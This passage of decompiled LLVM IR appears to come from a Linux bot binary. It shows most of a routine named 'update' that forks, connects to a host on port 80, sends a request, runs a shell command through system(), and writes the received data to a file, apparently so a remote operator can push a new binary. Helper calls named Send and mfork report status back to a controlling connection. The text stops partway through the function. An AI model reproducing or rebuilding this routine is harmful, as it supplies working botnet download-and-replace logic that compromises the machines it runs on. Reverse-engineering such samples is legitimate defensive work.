  %v4_8053b2d = bitcast i32* %stack_var_-20 to i8*
  %v5_8053b2d = call i32 @strncpy(i8* %v4_8053b2d, i32 %v1_8053b16, i32 16)
  %v3_8053b5a = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806b4ab.431 to i32))
  br label %dec_label_pc_8053b7b

dec_label_pc_8053b61:                             ; preds = %dec_label_pc_8053af6
  %v3_8053b76 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806b4c9.432 to i32))
  br label %dec_label_pc_8053b7b

dec_label_pc_8053b7b:                             ; preds = %dec_label_pc_8053afc, %dec_label_pc_8053b61
  %v1_8053b82 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053b87

dec_label_pc_8053b87:                             ; preds = %entry, %dec_label_pc_8053b7b
  %v0_8053b88 = phi i32 [ %v1_8053ae9, %entry ], [ %v1_8053b82, %dec_label_pc_8053b7b ]
  ret i32 %v0_8053b88

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053b87, { 1, 0 }
  uselistorder label %dec_label_pc_8053b7b, { 1, 0 }
}

define i32 @update(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %stack_var_-1132 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053b8d = load i32, i32* @esi, align 4
  store i32 %v0_8053b8d, i32* %stack_var_-12, align 4
  %v2_8053b8e = icmp ult i32* %stack_var_-12, inttoptr (i32 5264 to i32*)
  store i1 %v2_8053b8e, i1* %cf.global-to-local, align 1
  %v1_8053b94 = call i32 @__libc_getpid(i32 %v0_8053b8d)
  %v2_8053ba2 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053ba7 = icmp eq i32 %v2_8053ba2, 0
  %v1_8053ba9 = icmp eq i1 %v1_8053ba7, false
  br i1 %v1_8053ba9, label %dec_label_pc_80543e0, label %dec_label_pc_8053baf

dec_label_pc_8053baf:                             ; preds = %entry
  %v4_8053baf = add i32 %arg3, -1
  %v8_8053baf = icmp eq i32 %arg3, 0
  %v9_8053baf = sub i32 0, %arg3
  %v10_8053baf = and i32 %arg3, %v9_8053baf
  %v11_8053baf = icmp slt i32 %v10_8053baf, 0
  store i1 %v8_8053baf, i1* %cf.global-to-local, align 1
  %v12_8053baf = icmp eq i32 %v4_8053baf, 0
  %v13_8053baf = icmp slt i32 %v4_8053baf, 0
  %v3_8053bb3 = icmp eq i1 %v13_8053baf, %v11_8053baf
  %v4_8053bb3 = icmp eq i1 %v12_8053baf, false
  %v5_8053bb3 = and i1 %v4_8053bb3, %v3_8053bb3
  br i1 %v5_8053bb3, label %dec_label_pc_8053bdb, label %dec_label_pc_8053bb5

dec_label_pc_8053bb5:                             ; preds = %dec_label_pc_8053baf
  %v4_8053bca = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806b4e8.433 to i32))
  %v2_8053bd6 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053bdb

dec_label_pc_8053bdb:                             ; preds = %dec_label_pc_8053baf, %dec_label_pc_8053bb5
  %v5_8053bf2 = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_8053bfa = icmp ne i32 %v5_8053bf2, -1
  store i1 %v8_8053bfa, i1* %cf.global-to-local, align 1
  %v13_8053bfa = icmp eq i32 %v5_8053bf2, -1
  %v1_8053bfe = icmp eq i1 %v13_8053bfa, false
  br i1 %v1_8053bfe, label %dec_label_pc_8053c26, label %dec_label_pc_8053c00

dec_label_pc_8053c00:                             ; preds = %dec_label_pc_8053bdb
  %v4_8053c15 = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_806b510.434 to i32))
  %v2_8053c21 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053c26

dec_label_pc_8053c26:                             ; preds = %dec_label_pc_8053bdb, %dec_label_pc_8053c00
  store i32 2, i32* %stack_var_-108, align 4
  %v3_8053c33 = call i32 @htons(i16 80)
  %v1_8053c42 = add i32 %arg4, 4
  %v5_8053c42 = icmp ugt i32 %arg4, -5
  store i1 %v5_8053c42, i1* %cf.global-to-local, align 1
  %v1_8053c45 = inttoptr i32 %v1_8053c42 to i32*
  %v2_8053c45 = load i32, i32* %v1_8053c45, align 4
  %v2_8053c4a = call i32 @inet_addr(i32 %v2_8053c45)
  %v8_8053c52 = icmp ne i32 %v2_8053c4a, -1
  store i1 %v8_8053c52, i1* %cf.global-to-local, align 1
  %v13_8053c52 = icmp eq i32 %v2_8053c4a, -1
  %v1_8053c56 = icmp eq i1 %v13_8053c52, false
  br i1 %v1_8053c56, label %dec_label_pc_8053cb6, label %dec_label_pc_8053c58

dec_label_pc_8053c58:                             ; preds = %dec_label_pc_8053c26
  store i1 %v5_8053c42, i1* %cf.global-to-local, align 1
  %v2_8053c5e = load i32, i32* %v1_8053c45, align 4
  %v2_8053c63 = call i32 @__GI_gethostbyname(i32 %v2_8053c5e)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8053c6b = icmp eq i32 %v2_8053c63, 0
  %v1_8053c6f = icmp eq i1 %v4_8053c6b, false
  br i1 %v1_8053c6f, label %dec_label_pc_8053c97, label %dec_label_pc_8053c71

dec_label_pc_8053c71:                             ; preds = %dec_label_pc_8053c58
  %v4_8053c86 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80696f8.41 to i32))
  %v2_8053c92 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053c97

dec_label_pc_8053c97:                             ; preds = %dec_label_pc_8053c58, %dec_label_pc_8053c71
  %v1_8053c9a = add i32 %v2_8053c63, 12
  %v2_8053c9a = inttoptr i32 %v1_8053c9a to i32*
  %v3_8053c9a = load i32, i32* %v2_8053c9a, align 4
  %v1_8053ca2 = add i32 %v2_8053c63, 16
  %v2_8053ca2 = inttoptr i32 %v1_8053ca2 to i32*
  %v3_8053ca2 = load i32, i32* %v2_8053ca2, align 4
  %v1_8053ca5 = inttoptr i32 %v3_8053ca2 to i32*
  %v2_8053ca5 = load i32, i32* %v1_8053ca5, align 4
  store i32 %v2_8053ca5, i32* %edx.global-to-local, align 4
  %v5_8053caa = icmp eq i32* %stack_var_-108, inttoptr (i32 -4 to i32*)
  store i1 %v5_8053caa, i1* %cf.global-to-local, align 1
  %v15_8053caa = ptrtoint i32* %stack_var_-104 to i32
  %tmp96 = bitcast i32* %stack_var_-104 to i8*
  store i32 %v15_8053caa, i32* @edi, align 4
  %v1_8053caf = inttoptr i32 %v2_8053ca5 to i8*
  store i32 %v2_8053ca5, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8053cb2 = call i8* @_memcpy(i8* %tmp96, i8* %v1_8053caf, i32 %v3_8053c9a)
  br label %dec_label_pc_8053cbc

dec_label_pc_8053cb6:                             ; preds = %dec_label_pc_8053c26
  store i32 %v2_8053c4a, i32* %stack_var_-104, align 4
  br label %dec_label_pc_8053cbc

dec_label_pc_8053cbc:                             ; preds = %dec_label_pc_8053c97, %dec_label_pc_8053cb6
  %v2_8053ccc.pre-phi = ptrtoint i32* %stack_var_-108 to i32
  %v5_8053ccf = icmp ugt i32* %stack_var_-108, inttoptr (i32 -9 to i32*)
  store i1 %v5_8053ccf, i1* %cf.global-to-local, align 1
  %tmp97 = bitcast i32* %stack_var_-100 to i8*
  %v6_8053cd5 = call i32 @__GI_memset(i8* %tmp97, i32 0, i32 8)
  %v5_8053cef = call i32 @connect(i32 %v5_8053bf2, i32 %v2_8053ccc.pre-phi, i32 16)
  store i32 %v5_8053cef, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053cf4 = icmp eq i32 %v5_8053cef, 0
  br i1 %v1_8053cf4, label %dec_label_pc_8053d1e, label %dec_label_pc_8053cf8

dec_label_pc_8053cf8:                             ; preds = %dec_label_pc_8053cbc
  %v4_8053d0d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8069720.42 to i32))
  %v2_8053d19 = call i32 @__GI_exit(i32 0)
  store i32 %v2_8053d19, i32* @eax, align 4
  br label %dec_label_pc_8053d1e

dec_label_pc_8053d1e:                             ; preds = %dec_label_pc_8053cbc, %dec_label_pc_8053cf8
  %v5_8053d2d = call i32 @popen(i32 ptrtoint ([11 x i8]* @global_var_806b570.435 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8053d35 = icmp eq i32 %v5_8053d2d, 0
  br i1 %v4_8053d35, label %dec_label_pc_8053db7.preheader, label %dec_label_pc_8053d3b

dec_label_pc_8053d3b:                             ; preds = %dec_label_pc_8053d1e
  %v2_8053d4b = ptrtoint i32* %stack_var_-1132 to i32
  %tmp98 = bitcast i32* %stack_var_-1132 to i8*
  %v6_8053d54 = call i32 @__GI_memset(i8* %tmp98, i32 0, i32 1024)
  %v5_8053d71 = call i32 @fgets(i32 %v2_8053d4b, i32 1024, i32 %v5_8053d2d)
  %v5_8053d87 = call i32 @strstr(i32 %v2_8053d4b, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806b57b.436, i32 0, i32 0))
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053d8c = icmp eq i32 %v5_8053d87, 0
  %v1_8053d8e = icmp eq i1 %v1_8053d8c, false
  %. = zext i1 %v1_8053d8e to i8
  %v2_8053da0 = call i32 @pclose(i32 %v5_8053d2d)
  br label %dec_label_pc_8053db7.preheader

dec_label_pc_8053db7.preheader:                   ; preds = %dec_label_pc_8053d3b, %dec_label_pc_8053d1e
  %stack_var_-73.0.ph = phi i8 [ 0, %dec_label_pc_8053d1e ], [ %., %dec_label_pc_8053d3b ]
  %v1_8053dbd = add i32 %arg4, 8
  %v5_8053dbd = icmp ugt i32 %arg4, -9
  %v1_8053dc0 = inttoptr i32 %v1_8053dbd to i32*
  br label %dec_label_pc_8053db7

dec_label_pc_8053db4:                             ; preds = %dec_label_pc_8053de1
  %v4_8053db4 = add i32 %storemerge12, 1
  br label %dec_label_pc_8053db7

dec_label_pc_8053db7:                             ; preds = %dec_label_pc_8053db7.preheader, %dec_label_pc_8053db4
  %storemerge12 = phi i32 [ %v4_8053db4, %dec_label_pc_8053db4 ], [ 0, %dec_label_pc_8053db7.preheader ]
  store i32 %storemerge12, i32* %edx.global-to-local, align 4
  store i1 %v5_8053dbd, i1* %cf.global-to-local, align 1
  %v2_8053dc0 = load i32, i32* %v1_8053dc0, align 4
  store i1 false, i1* @df, align 1
  %v4_8053dd0 = inttoptr i32 %v2_8053dc0 to i8*
  store i32 %v2_8053dc0, i32* @edi, align 4
  %v3_8053dd6 = call i32 @_strlen(i8* %v4_8053dd0)
  %v0_8053ddd = load i32, i32* %edx.global-to-local, align 4
  %v7_8053ddd = icmp ult i32 %v0_8053ddd, %v3_8053dd6
  store i1 %v7_8053ddd, i1* %cf.global-to-local, align 1
  %v1_8053ddf = icmp eq i1 %v7_8053ddd, false
  br i1 %v1_8053ddf, label %dec_label_pc_8053df6, label %dec_label_pc_8053de1

dec_label_pc_8053de1:                             ; preds = %dec_label_pc_8053db7
  store i1 %v5_8053dbd, i1* %cf.global-to-local, align 1
  %v2_8053de7 = load i32, i32* %v1_8053dc0, align 4
  store i32 %v2_8053de7, i32* %edx.global-to-local, align 4
  %v2_8053dec = add i32 %v2_8053de7, %storemerge12
  %v1_8053def = inttoptr i32 %v2_8053dec to i8*
  %v2_8053def = load i8, i8* %v1_8053def, align 1
  %v6_8053df2 = icmp ult i8 %v2_8053def, 58
  store i1 %v6_8053df2, i1* %cf.global-to-local, align 1
  %v10_8053df2 = icmp eq i8 %v2_8053def, 58
  %v1_8053df4 = icmp eq i1 %v10_8053df2, false
  br i1 %v1_8053df4, label %dec_label_pc_8053db4, label %dec_label_pc_8053df6

dec_label_pc_8053df6:                             ; preds = %dec_label_pc_8053de1, %dec_label_pc_8053db7
  %v2_8053dfc = load i32, i32* %v1_8053dc0, align 4
  store i32 %v2_8053dfc, i32* %edx.global-to-local, align 4
  %v2_8053e01 = add i32 %v2_8053dfc, %storemerge12
  %v1_8053e04 = inttoptr i32 %v2_8053e01 to i8*
  store i8 0, i8* %v1_8053e04, align 1
  %v4_8053e07 = icmp eq i8 %stack_var_-73.0.ph, 0
  store i1 %v5_8053dbd, i1* %cf.global-to-local, align 1
  br i1 %v4_8053e07, label %dec_label_pc_8053e1a, label %dec_label_pc_8053e2c

dec_label_pc_8053e1a:                             ; preds = %dec_label_pc_8053df6
  %v2_8053e20 = load i32, i32* %v1_8053dc0, align 4
  store i32 %v2_8053e20, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053e2c

dec_label_pc_8053e2c:                             ; preds = %dec_label_pc_8053df6, %dec_label_pc_8053e1a
  store i1 %v5_8053c42, i1* %cf.global-to-local, align 1
  %v4_8053e4d = call i32 @Send(i32 %v5_8053bf2, i32 ptrtoint ([276 x i8]* @global_var_8069748.43 to i32))
  %v4_8053e67 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806b581.437 to i32))
  %v2_8053e73 = call i32 @system(i32 ptrtoint ([11 x i8]* @global_var_806b59f.438 to i32))
  store i32 %v2_8053e73, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v4_8053e07, label %dec_label_pc_8054117, label %dec_label_pc_8053e82

dec_label_pc_8053e82:                             ; preds = %dec_label_pc_8053e2c
  %v4_8053e91 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806b5aa.439 to i32), i32 ptrtoint ([3 x i8]* @global_var_8069878.45 to i32))
  %v2_8053ea9 = ptrtoint i32* %stack_var_-5228 to i32
  %v6_8053eb9187 = call i32 @recv(i32 %v5_8053bf2, i32 %v2_8053ea9, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp99190 = icmp slt i32 %v6_8053eb9187, 1
  br i1 %tmp99190, label %dec_label_pc_8053fe1.preheader.loopexit24, label %dec_label_pc_8053ecb

dec_label_pc_8053e99.loopexit:                    ; preds = %dec_label_pc_8053fcd
  %v6_8053eb9 = call i32 @recv(i32 %v5_8053bf2, i32 %v2_8053ea9, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp99 = icmp slt i32 %v6_8053eb9, 1
  br i1 %tmp99, label %dec_label_pc_8053fe1.preheader.loopexit24, label %dec_label_pc_8053ecb

dec_label_pc_8053ecb:                             ; preds = %dec_label_pc_8053e82, %dec_label_pc_8053e99.loopexit
  %v6_8053eb9191 = phi i32 [ %v6_8053eb9, %dec_label_pc_8053e99.loopexit ], [ %v6_8053eb9187, %dec_label_pc_8053e82 ]
  %v4_8053ecb = add i32 %v6_8053eb9191, -4095
  %v8_8053ecb = icmp ult i32 %v6_8053eb9191, 4095
  %v9_8053ecb = sub i32 4094, %v6_8053eb9191
  %v10_8053ecb = and i32 %v9_8053ecb, %v6_8053eb9191
  %v11_8053ecb = icmp slt i32 %v10_8053ecb, 0
  store i1 %v8_8053ecb, i1* %cf.global-to-local, align 1
  %v12_8053ecb = icmp eq i32 %v4_8053ecb, 0
  %v13_8053ecb = icmp slt i32 %v4_8053ecb, 0
  %v3_8053ed2 = icmp eq i1 %v13_8053ecb, %v11_8053ecb
  %v4_8053ed2 = icmp eq i1 %v12_8053ecb, false
  %v5_8053ed2 = and i1 %v4_8053ed2, %v3_8053ed2
  br i1 %v5_8053ed2, label %dec_label_pc_8053eeb.lr.ph, label %dec_label_pc_8053ed4

dec_label_pc_8053ed4:                             ; preds = %dec_label_pc_8053ecb
  %v0_8053ed7 = load i32, i32* @ebp, align 4
  %v2_8053ed7 = add i32 %v6_8053eb9191, -5224
  %v3_8053ed7 = add i32 %v2_8053ed7, %v0_8053ed7
  %v4_8053ed7 = inttoptr i32 %v3_8053ed7 to i8*
  store i8 0, i8* %v4_8053ed7, align 1
  br label %dec_label_pc_8053eeb.lr.ph

dec_label_pc_8053eeb.lr.ph:                       ; preds = %dec_label_pc_8053ed4, %dec_label_pc_8053ecb
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053eeb

dec_label_pc_8053eeb:                             ; preds = %dec_label_pc_8053eeb.lr.ph, %dec_label_pc_8053fcd
  %storemerge6186 = phi i32 [ 0, %dec_label_pc_8053eeb.lr.ph ], [ %v4_8053fcd, %dec_label_pc_8053fcd ]
  store i32 %storemerge6186, i32* %edx.global-to-local, align 4
  %v2_8053ef6 = add i32 %storemerge6186, %v2_8053ea9
  %v7_8053ef6 = icmp ult i32 %v2_8053ef6, %v2_8053ea9
  store i1 %v7_8053ef6, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8053f13 = inttoptr i32 %v2_8053ef6 to i8*
  store i32 %v2_8053ef6, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_806987b.46 to i32), i32* @edi, align 4
  %v7_8053f25 = call i32 @_strncmp(i8* %v4_8053f13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806987b.46, i32 0, i32 0), i32 4)
  %v8_8053f25 = urem i32 %v7_8053f25, 2
  %v9_8053f25 = icmp eq i32 %v8_8053f25, 0
  %v0_8053f27 = load i1, i1* %cf.global-to-local, align 1
  %v2_8053f27 = or i1 %v0_8053f27, %v9_8053f25
  %v3_8053f27 = zext i1 %v2_8053f27 to i32
  %v4_8053f27 = load i32, i32* %edx.global-to-local, align 4
  %v5_8053f27 = and i32 %v4_8053f27, -256
  %v6_8053f27 = or i32 %v3_8053f27, %v5_8053f27
  %v7_8053f27 = xor i32 %v6_8053f27, 1
  store i32 %v7_8053f27, i32* %edx.global-to-local, align 4
  %v3_8053f2d = and i32 %v7_8053f25, -256
  %v1_8053f2f = trunc i32 %v7_8053f27 to i8
  %v3_8053f2f = zext i1 %v0_8053f27 to i8
  %v4_8053f2f = sub nsw i8 %v1_8053f2f, %v3_8053f2f
  %v15_8053f2f = icmp eq i8 %v4_8053f2f, 0
  %v20_8053f2f = zext i8 %v4_8053f2f to i32
  %v23_8053f2f = or i32 %v20_8053f2f, %v3_8053f2d
  store i32 %v23_8053f2f, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053f38 = icmp eq i1 %v15_8053f2f, false
  br i1 %v1_8053f38, label %dec_label_pc_8053fcd, label %dec_label_pc_8053f3e

dec_label_pc_8053f3e:                             ; preds = %dec_label_pc_8053eeb
  %v4_8053f3e = add i32 %storemerge6186, 4
  %v1_8053f4d = add i32 %v4_8053e91, 52
  %v2_8053f4d = inttoptr i32 %v1_8053f4d to i32*
  %v1_8053f57 = add i32 %v4_8053e91, 16
  %v2_8053f57 = inttoptr i32 %v1_8053f57 to i32*
  %v1_8053f5d = add i32 %v4_8053e91, 28
  %v2_8053f5d = inttoptr i32 %v1_8053f5d to i32*
  %v10_8053fc2168 = icmp ult i32 %v4_8053f3e, %v6_8053eb9191
  store i1 %v10_8053fc2168, i1* %cf.global-to-local, align 1
  %v5_8053fc5175 = icmp slt i32 %v4_8053f3e, %v6_8053eb9191
  br i1 %v5_8053fc5175, label %dec_label_pc_8053f44, label %dec_label_pc_8053fe1.preheader

dec_label_pc_8053f44:                             ; preds = %dec_label_pc_8053f3e, %dec_label_pc_8053fbc
  %storemerge19.in176 = phi i32 [ %v4_8053fbc, %dec_label_pc_8053fbc ], [ %v4_8053f3e, %dec_label_pc_8053f3e ]
  %v3_8053f4d = load i32, i32* %v2_8053f4d, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053f50 = icmp eq i32 %v3_8053f4d, 0
  br i1 %v1_8053f50, label %dec_label_pc_8053f9f, label %dec_label_pc_8053f54

dec_label_pc_8053f54:                             ; preds = %dec_label_pc_8053f44
  %v3_8053f57 = load i32, i32* %v2_8053f57, align 4
  store i32 %v3_8053f57, i32* %edx.global-to-local, align 4
  %v3_8053f5d = load i32, i32* %v2_8053f5d, align 4
  %v7_8053f60 = icmp ult i32 %v3_8053f57, %v3_8053f5d
  store i1 %v7_8053f60, i1* %cf.global-to-local, align 1
  %v1_8053f62 = icmp eq i1 %v7_8053f60, false
  br i1 %v1_8053f62, label %dec_label_pc_8053f80, label %dec_label_pc_8053f64

dec_label_pc_8053f64:                             ; preds = %dec_label_pc_8053f54
  %v3_8053f67 = load i32, i32* %v2_8053f57, align 4
  store i32 %v3_8053f67, i32* %edx.global-to-local, align 4
  %v0_8053f6d = load i32, i32* @ebp, align 4
  %v2_8053f6d = add i32 %storemerge19.in176, -5224
  %v3_8053f6d = add i32 %v2_8053f6d, %v0_8053f6d
  %v4_8053f6d = inttoptr i32 %v3_8053f6d to i8*
  %v5_8053f6d = load i8, i8* %v4_8053f6d, align 1
  %v3_8053f75 = inttoptr i32 %v3_8053f67 to i8*
  store i8 %v5_8053f6d, i8* %v3_8053f75, align 1
  %v0_8053f77 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f77 = add i32 %v0_8053f77, 1
  store i32 %v1_8053f77, i32* %edx.global-to-local, align 4
  store i32 %v1_8053f77, i32* %v2_8053f57, align 4
  br label %dec_label_pc_8053fbc

dec_label_pc_8053f80:                             ; preds = %dec_label_pc_8053f54
  %v0_8053f83 = load i32, i32* @ebp, align 4
  %v2_8053f83 = add i32 %storemerge19.in176, -5224
  %v3_8053f83 = add i32 %v2_8053f83, %v0_8053f83
  %v4_8053f83 = inttoptr i32 %v3_8053f83 to i8*
  %v5_8053f83 = load i8, i8* %v4_8053f83, align 1
  %v2_8053f8b = sext i8 %v5_8053f83 to i32
  store i32 %v2_8053f8b, i32* @edx, align 4
  %v5_8053f98 = call i32 @putc_unlocked(i8 %v5_8053f83, i32 %v4_8053e91)
  br label %dec_label_pc_8053fbc

dec_label_pc_8053f9f:                             ; preds = %dec_label_pc_8053f44
  %v0_8053fa2 = load i32, i32* @ebp, align 4
  %v2_8053fa2 = add i32 %storemerge19.in176, -5224
  %v3_8053fa2 = add i32 %v2_8053fa2, %v0_8053fa2
  %v4_8053fa2 = inttoptr i32 %v3_8053fa2 to i8*
  %v5_8053fa2 = load i8, i8* %v4_8053fa2, align 1
  %v2_8053faa = sext i8 %v5_8053fa2 to i32
  store i32 %v2_8053faa, i32* @edx, align 4
  %v5_8053fb7 = call i32 @__GI_fputc(i8 %v5_8053fa2, i32 %v4_8053e91)
  br label %dec_label_pc_8053fbc

dec_label_pc_8053fbc:                             ; preds = %dec_label_pc_8053f80, %dec_label_pc_8053f64, %dec_label_pc_8053f9f
  %v4_8053fbc = add i32 %storemerge19.in176, 1
  %v10_8053fc2 = icmp ult i32 %v4_8053fbc, %v6_8053eb9191
  store i1 %v10_8053fc2, i1* %cf.global-to-local, align 1
  %exitcond198 = icmp eq i32 %v4_8053fbc, %v6_8053eb9191
  br i1 %exitcond198, label %dec_label_pc_8053fe1.preheader, label %dec_label_pc_8053f44

dec_label_pc_8053fe1.preheader.loopexit24:        ; preds = %dec_label_pc_8053e99.loopexit, %dec_label_pc_8053e82
  %.pre45 = add i32 %v4_8053e91, 52
  %.pre46 = inttoptr i32 %.pre45 to i32*
  %.pre47 = add i32 %v4_8053e91, 16
  %.pre48 = inttoptr i32 %.pre47 to i32*
  %.pre49 = add i32 %v4_8053e91, 28
  %.pre50 = inttoptr i32 %.pre49 to i32*
  br label %dec_label_pc_8053fe1.preheader

dec_label_pc_8053fe1.preheader:                   ; preds = %dec_label_pc_8053f3e, %dec_label_pc_8053fbc, %dec_label_pc_8053fe1.preheader.loopexit24
  %v2_8054049.pre-phi = phi i32* [ %.pre50, %dec_label_pc_8053fe1.preheader.loopexit24 ], [ %v2_8053f5d, %dec_label_pc_8053fbc ], [ %v2_8053f5d, %dec_label_pc_8053f3e ]
  %v2_8054043.pre-phi = phi i32* [ %.pre48, %dec_label_pc_8053fe1.preheader.loopexit24 ], [ %v2_8053f57, %dec_label_pc_8053fbc ], [ %v2_8053f57, %dec_label_pc_8053f3e ]
  %v2_8054039.pre-phi = phi i32* [ %.pre46, %dec_label_pc_8053fe1.preheader.loopexit24 ], [ %v2_8053f4d, %dec_label_pc_8053fbc ], [ %v2_8053f4d, %dec_label_pc_8053f3e ]
  %v6_8054001162 = call i32 @recv(i32 %v5_8053bf2, i32 %v2_8053ea9, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp100165 = icmp slt i32 %v6_8054001162, 1
  br i1 %tmp100165, label %dec_label_pc_80540bc, label %dec_label_pc_8054013

dec_label_pc_8053fcd:                             ; preds = %dec_label_pc_8053eeb
  %v4_8053fcd = add nuw nsw i32 %storemerge6186, 1
  %v10_8053fd3 = icmp ult i32 %v4_8053fcd, %v6_8053eb9191
  store i1 %v10_8053fd3, i1* %cf.global-to-local, align 1
  %v5_8053fd6 = icmp slt i32 %v4_8053fcd, %v6_8053eb9191
  br i1 %v5_8053fd6, label %dec_label_pc_8053eeb, label %dec_label_pc_8053e99.loopexit

dec_label_pc_8053fe1.loopexit:                    ; preds = %dec_label_pc_80540a8
  %v6_8054001 = call i32 @recv(i32 %v5_8053bf2, i32 %v2_8053ea9, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp100 = icmp slt i32 %v6_8054001, 1
  br i1 %tmp100, label %dec_label_pc_80540bc, label %dec_label_pc_8054013

dec_label_pc_8054013:                             ; preds = %dec_label_pc_8053fe1.preheader, %dec_label_pc_8053fe1.loopexit
  %v6_8054001166 = phi i32 [ %v6_8054001, %dec_label_pc_8053fe1.loopexit ], [ %v6_8054001162, %dec_label_pc_8053fe1.preheader ]
  %v4_8054013 = add i32 %v6_8054001166, -4095
  %v8_8054013 = icmp ult i32 %v6_8054001166, 4095
  %v9_8054013 = sub i32 4094, %v6_8054001166
  %v10_8054013 = and i32 %v9_8054013, %v6_8054001166
  %v11_8054013 = icmp slt i32 %v10_8054013, 0
  store i1 %v8_8054013, i1* %cf.global-to-local, align 1
  %v12_8054013 = icmp eq i32 %v4_8054013, 0
  %v13_8054013 = icmp slt i32 %v4_8054013, 0
  %v3_805401a = icmp eq i1 %v13_8054013, %v11_8054013
  %v4_805401a = icmp eq i1 %v12_8054013, false
  %v5_805401a = and i1 %v4_805401a, %v3_805401a
  br i1 %v5_805401a, label %dec_label_pc_8054030.lr.ph, label %dec_label_pc_805401c

dec_label_pc_805401c:                             ; preds = %dec_label_pc_8054013
  %v0_805401f = load i32, i32* @ebp, align 4
  %v2_805401f = add i32 %v6_8054001166, -5224
  %v3_805401f = add i32 %v2_805401f, %v0_805401f
  %v4_805401f = inttoptr i32 %v3_805401f to i8*
  store i8 0, i8* %v4_805401f, align 1
  br label %dec_label_pc_8054030.lr.ph

dec_label_pc_8054030.lr.ph:                       ; preds = %dec_label_pc_805401c, %dec_label_pc_8054013
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8054030

dec_label_pc_8054030:                             ; preds = %dec_label_pc_80540a8, %dec_label_pc_8054030.lr.ph
  %storemerge161 = phi i32 [ 0, %dec_label_pc_8054030.lr.ph ], [ %v4_80540a8, %dec_label_pc_80540a8 ]
  %v3_8054039 = load i32, i32* %v2_8054039.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805403c = icmp eq i32 %v3_8054039, 0
  br i1 %v1_805403c, label %dec_label_pc_805408b, label %dec_label_pc_8054040

dec_label_pc_8054040:                             ; preds = %dec_label_pc_8054030
  %v3_8054043 = load i32, i32* %v2_8054043.pre-phi, align 4
  store i32 %v3_8054043, i32* %edx.global-to-local, align 4
  %v3_8054049 = load i32, i32* %v2_8054049.pre-phi, align 4
  %v7_805404c = icmp ult i32 %v3_8054043, %v3_8054049
  store i1 %v7_805404c, i1* %cf.global-to-local, align 1
  %v1_805404e = icmp eq i1 %v7_805404c, false
  br i1 %v1_805404e, label %dec_label_pc_805406c, label %dec_label_pc_8054050

dec_label_pc_8054050:                             ; preds = %dec_label_pc_8054040
  %v3_8054053 = load i32, i32* %v2_8054043.pre-phi, align 4
  store i32 %v3_8054053, i32* %edx.global-to-local, align 4
  %v0_8054059 = load i32, i32* @ebp, align 4
  %v2_8054059 = add nsw i32 %storemerge161, -5224
  %v3_8054059 = add i32 %v2_8054059, %v0_8054059
  %v4_8054059 = inttoptr i32 %v3_8054059 to i8*
  %v5_8054059 = load i8, i8* %v4_8054059, align 1
  %v3_8054061 = inttoptr i32 %v3_8054053 to i8*
  store i8 %v5_8054059, i8* %v3_8054061, align 1
  %v0_8054063 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054063 = add i32 %v0_8054063, 1
  store i32 %v1_8054063, i32* %edx.global-to-local, align 4
  store i32 %v1_8054063, i32* %v2_8054043.pre-phi, align 4
  br label %dec_label_pc_80540a8

dec_label_pc_805406c:                             ; preds = %dec_label_pc_8054040
  %v0_805406f = load i32, i32* @ebp, align 4
  %v2_805406f = add nsw i32 %storemerge161, -5224
  %v3_805406f = add i32 %v2_805406f, %v0_805406f
  %v4_805406f = inttoptr i32 %v3_805406f to i8*
  %v5_805406f = load i8, i8* %v4_805406f, align 1
  %v2_8054077 = sext i8 %v5_805406f to i32
  store i32 %v2_8054077, i32* @edx, align 4
  %v5_8054084 = call i32 @putc_unlocked(i8 %v5_805406f, i32 %v4_8053e91)
